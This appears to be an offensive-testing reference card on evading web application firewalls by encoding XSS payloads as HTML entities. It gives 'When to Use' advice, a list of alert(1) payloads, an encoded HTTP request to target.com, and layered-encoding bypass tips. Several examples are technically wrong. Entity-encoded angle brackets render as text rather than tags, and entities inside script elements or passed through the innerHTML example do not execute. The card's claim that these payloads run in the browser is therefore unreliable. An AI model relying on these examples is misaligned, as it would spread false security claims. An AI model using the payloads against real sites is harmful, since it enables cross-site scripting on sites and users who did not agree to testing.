---
id: WAF-EVASION-06
title: HTML Representation
category: Evasion Techniques
severity_range: Low-Medium
owasp_ref: https://github.com/0xInfection/Awesome-WAF
---

# WAF-EVASION-06: HTML Representation

## Summary

HTML representation evasion uses SGML character entities (named entities, decimal numeric references, and hexadecimal numeric references) to encode payload characters. Since WAFs may not decode HTML entities before pattern matching, but browsers always decode them when rendering, payloads encoded as HTML entities can bypass detection and execute in the browser.

## When to Use

- Against WAFs that inspect raw HTTP traffic without HTML entity decoding
- When the vulnerable parameter value is rendered into HTML without additional encoding
- For XSS payloads where the injection point is inside an existing HTML context
- Against WAFs that decode URL encoding but not HTML entities

## Technique Details

HTML entities come in three forms:

1. **Named entities**: `&lt;` `<`, `&gt;` `>`, `&quot;` `"`, `&amp;` `&`
2. **Decimal numeric references**: `&#60;` `<`, `&#62;` `>`, `&#34;` `"`
3. **Hexadecimal numeric references**: `&#x3C;` `<`, `&#x3E;` `>`, `&#x22;` `"`

The browser's HTML parser decodes these entities before DOM construction. If the WAF performs regex matching on the raw request body without HTML entity decoding, the encoded payload passes through.

## Payload Examples

```html
<!-- Named HTML entities -->
&lt;img src=x onerror=alert(1)&gt;

<!-- Decimal numeric references -->
&#60;img src=x onerror=alert(1)&#62;

<!-- Hexadecimal numeric references -->
&#x3C;img src=x onerror=alert(1)&#x3E;

<!-- Mixed encoding within a single payload -->
&#x3C;img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)&#x3E;
<!-- &#97;=a, &#108;=l, &#101;=e, &#114;=r, &#116;=t -->

<!-- Encoding the entire keyword -->
<script>&#97;&#108;&#101;&#114;&#116;(1)</script>

<!-- Nested entity trick -->
<img src=x onerror="&quot;&gt;&lt;img src=x onerror=alert(1)&gt;">
```

```http
# HTTP request with HTML-encoded XSS
GET /search?q=%3Cimg+src%3Dx+onerror%3D%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B(1)%3E HTTP/1.1
Host: target.com
# Double layer: URL-encoded HTML entities
```

```javascript
// JavaScript string with HTML entities evaluated via innerHTML
document.body.innerHTML = "&#60;img src=x onerror=alert(1)&#62;";
```

## Detection & Bypass Notes

**Detection:**
- WAFs with HTML entity decoding as a preprocessing step will detect payloads encoded this way.
- Modern WAFs (ModSecurity CRS 3.x+, AWS WAF with managed rules) decode HTML entities before inspection.
- Behavioral detection of the rendered DOM (client-side WAF) can catch entity-encoded payloads.

**Bypass:**
- Combine HTML entities with URL encoding for layered evasion: `%26%2360%3B` (URL-encoded `&#60;`)
- Use decimal and hex references interchangeably within the same payload.
- For numeric references, pad with leading zeros (e.g., `&#0000060;`) which some decoders mishandle.
- HTML entities can encode any character, including ones used in event handler names: `&#111;&#110;&#101;&#114;&#114;&#111;&#114;` = `onerror`.

## References

- https://github.com/0xInfection/Awesome-WAF
- https://html.spec.whatwg.org/multipage/syntax.html#character-references
- https://dev.w3.org/html5/html-author/charref
